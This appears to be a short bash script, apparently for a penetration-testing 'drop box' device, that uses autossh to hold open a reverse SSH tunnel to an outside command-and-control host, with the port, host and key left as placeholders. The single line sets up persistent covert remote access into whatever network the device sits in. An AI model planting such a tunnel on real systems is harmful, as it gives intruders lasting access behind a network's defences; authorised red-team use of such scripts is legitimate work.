#!/bin/bash
autossh -fN -R <c2 port for ssh to dropbox>:localhost:22 -L 3501:localhost:3501 user@domain -i /home/pi/.ssh/<key> &